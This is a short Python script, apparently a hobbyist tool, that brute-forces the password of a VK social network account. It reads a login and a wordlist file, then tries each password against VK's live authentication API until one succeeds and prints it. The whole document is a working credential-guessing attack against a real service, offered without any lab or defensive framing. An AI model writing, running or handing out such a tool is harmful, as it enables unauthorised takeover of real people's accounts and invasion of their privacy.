import colorama
from colorama import Back,Style,Fore
import sys
import os
import vk
import vk_api
colorama.init()
def main():
 global login,path_to_file
 login=input("Enter login:")
 path_to_file=input("Enter path to file with passwords:")
 get_password()
def get_password():
 with open (path_to_file,'r') as file:
  for password in file.readlines():
   brute(password)
def brute(password):
 try:
  session = vk_api.VkApi(login,password)
  session.auth()
  session.get_api()
  print(Fore.GREEN+"Password was found:{}".format(password)+Fore.RESET)
  sys.exit()
 except vk_api.AuthError:
  print(Fore.RED+"Wrong password:{}".format(password)+Fore.RESET)
